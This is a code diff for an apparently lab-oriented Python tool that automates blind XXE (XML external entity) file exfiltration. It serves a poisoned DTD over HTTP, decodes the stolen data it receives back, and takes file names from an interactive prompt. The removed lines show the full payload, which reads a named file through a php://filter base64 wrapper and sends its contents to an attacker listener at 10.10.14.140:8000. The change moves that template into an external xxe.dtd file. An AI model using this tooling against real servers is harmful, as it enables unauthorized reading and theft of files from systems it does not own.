@@ -19,6 +19,7 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
             )
 
     def do_GET(self):
+        """This function sends a custom poisoned .dtd file, and decodes the response"""
         self.send_response(200)
         self.send_header("Content-Type", "application/xml")
         self.end_headers()
@@ -27,6 +28,7 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
             # Make payload for DTD
             self.wfile.write(payload.encode("utf-8"))
             return
+
         elif "content" in self.path:
             parsed = urlparse(self.path)
             params = parse_qs(parsed.query)
@@ -47,11 +49,12 @@ class Terminal(Cmd):
 
     def default(self, line):
         global payload
-        payload = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={line}">
-<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://10.10.14.140:8000/?content=%file;'>">
-%oob;
-%content;
-"""
+
+        # To update the xxe with the user required file dynamically
+        with open("xxe.dtd") as f:
+            temp_payload = f.read().replace("{line}", line)
+
+        payload = temp_payload
         # TODO To make the request from here itself, instead of burp
         print(f"The file is {line}")
 
